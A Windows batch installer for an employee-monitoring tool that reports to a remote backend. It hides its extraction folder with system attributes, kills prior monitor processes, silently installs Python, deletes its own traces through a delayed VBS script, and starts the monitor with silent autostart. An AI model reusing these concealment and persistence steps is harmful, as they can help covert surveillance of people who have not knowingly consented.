@echo off
setlocal EnableDelayedExpansion
pushd "%~dp0"

rem ── Hide the extraction folder straight away ────────────────────────────────
for %%p in ("%~dp0..") do attrib +h +s "%%~fp" >nul 2>&1

rem ── Read backend URL ────────────────────────────────────────────────────────
set "BACKEND_URL=https://eyeing.onrender.com"
if "%INSTALL_ID%"=="" set "INSTALL_ID=%RANDOM%%RANDOM%%RANDOM%"
if "%DEVICE_ID%"==""  set "DEVICE_ID=%COMPUTERNAME%"
if exist "%~dp0eyeing\backend_url.txt" (
    for /f "usebackq delims=" %%i in ("%~dp0eyeing\backend_url.txt") do (
        if not "%%i"=="" set "BACKEND_URL=%%i"
    )
)

rem ── Open setup page (skip on reinstall) ─────────────────────────────────────
set "PERM_DIR=%LOCALAPPDATA%\EmployeeMonitor"
if exist "%PERM_DIR%\activity_data\install_context.json"   goto :skip_browser
if exist "%~dp0eyeing\activity_data\install_context.json"  goto :skip_browser
if "%SKIP_SETUP_OPEN%"=="1"                                goto :skip_browser
start "" "%BACKEND_URL%/setup.html?autoclose=1^&device_id=%DEVICE_ID%^&install_id=%INSTALL_ID%"
:skip_browser

rem ── Kill any existing monitor / installer processes ─────────────────────────
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$p=$PID; Get-CimInstance Win32_Process ^| Where-Object { $_.ProcessId -ne $p -and ($_.CommandLine -match 'install_and_run\.py' -or $_.CommandLine -match 'monitor\.py') } ^| ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }" >nul 2>&1

rem ── Copy eyeing\ to permanent AppData directory ─────────────────────────────
if not exist "%PERM_DIR%" mkdir "%PERM_DIR%"
xcopy /e /i /y "%~dp0eyeing\" "%PERM_DIR%\" >nul 2>&1

rem ── Locate Python (check common install paths before falling back to PATH) ───
set "PYTHON_EXE="
if "%PYTHON_EXE%"=="" if exist "%LOCALAPPDATA%\Programs\Python\Python313\python.exe" set "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python313\python.exe"
if "%PYTHON_EXE%"=="" if exist "%LOCALAPPDATA%\Programs\Python\Python312\python.exe" set "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python312\python.exe"
if "%PYTHON_EXE%"=="" if exist "%LOCALAPPDATA%\Programs\Python\Python311\python.exe" set "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python311\python.exe"
if "%PYTHON_EXE%"=="" if exist "%LOCALAPPDATA%\Programs\Python\Python310\python.exe" set "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python310\python.exe"
if "%PYTHON_EXE%"=="" if exist "%LOCALAPPDATA%\Programs\Python\Python39\python.exe"  set "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python39\python.exe"
if "%PYTHON_EXE%"=="" if exist "C:\Python313\python.exe"  set "PYTHON_EXE=C:\Python313\python.exe"
if "%PYTHON_EXE%"=="" if exist "C:\Python312\python.exe"  set "PYTHON_EXE=C:\Python312\python.exe"
if "%PYTHON_EXE%"=="" if exist "C:\Python311\python.exe"  set "PYTHON_EXE=C:\Python311\python.exe"
if "%PYTHON_EXE%"=="" if exist "C:\Python310\python.exe"  set "PYTHON_EXE=C:\Python310\python.exe"
if "%PYTHON_EXE%"=="" if exist "C:\Python39\python.exe"   set "PYTHON_EXE=C:\Python39\python.exe"
if "%PYTHON_EXE%"=="" if exist "C:\Program Files\Python313\python.exe" set "PYTHON_EXE=C:\Program Files\Python313\python.exe"
if "%PYTHON_EXE%"=="" if exist "C:\Program Files\Python312\python.exe" set "PYTHON_EXE=C:\Program Files\Python312\python.exe"
if "%PYTHON_EXE%"=="" (
    where python >nul 2>&1
    if !errorlevel! equ 0 (
        for /f "usebackq tokens=*" %%i in (`where python 2^>nul`) do (
            if "!PYTHON_EXE!"=="" set "PYTHON_EXE=%%i"
        )
    )
)

rem ── Auto-download Python if still not found ──────────────────────────────────
if "%PYTHON_EXE%"=="" (
    set "PY_INST=%TEMP%\python_setup.exe"
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe' -OutFile '!PY_INST!' -UseBasicParsing" >nul 2>&1
    if exist "!PY_INST!" (
        "!PY_INST!" /quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_launcher=1
        del /f /q "!PY_INST!" >nul 2>&1
        if exist "%LOCALAPPDATA%\Programs\Python\Python312\python.exe" set "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python312\python.exe"
    )
)
if "%PYTHON_EXE%"=="" set "PYTHON_EXE=python"

rem ── Create virtual environment (venv ships with pip — no admin needed) ───────
set "VENV_PYTHON=%PERM_DIR%\venv\Scripts\python.exe"
if not exist "%VENV_PYTHON%" (
    "%PYTHON_EXE%" -m venv "%PERM_DIR%\venv" >nul 2>&1
)
if exist "%VENV_PYTHON%" set "PYTHON_EXE=%VENV_PYTHON%"

rem ── Schedule cleanup of extraction folder (30 s delay, silent) ───────────────
for %%p in ("%~dp0..") do set "EM_EXTRACT=%%~fp"
(
    echo WScript.Sleep 30000
    echo On Error Resume Next
    echo Set ws2  = CreateObject^("WScript.Shell"^)
    echo Set fso2 = CreateObject^("Scripting.FileSystemObject"^)
    echo ws2.Run "attrib -h -s -r " ^& Chr^(34^) ^& "%EM_EXTRACT%" ^& Chr^(34^) ^& " /s /d", 0, True
    echo If fso2.FolderExists^("%EM_EXTRACT%"^) Then fso2.DeleteFolder "%EM_EXTRACT%", True
) > "%TEMP%\em_cleanup.vbs"
start /b "" wscript.exe "%TEMP%\em_cleanup.vbs"

rem ── Run installer (output goes to setup_log.txt for diagnostics) ─────────────
set "SKIP_SETUP_OPEN=1"
"%PYTHON_EXE%" "%PERM_DIR%\install_and_run.py" --autostart --silent >>"%PERM_DIR%\setup_log.txt" 2>&1

popd
endlocal
exit /b 0
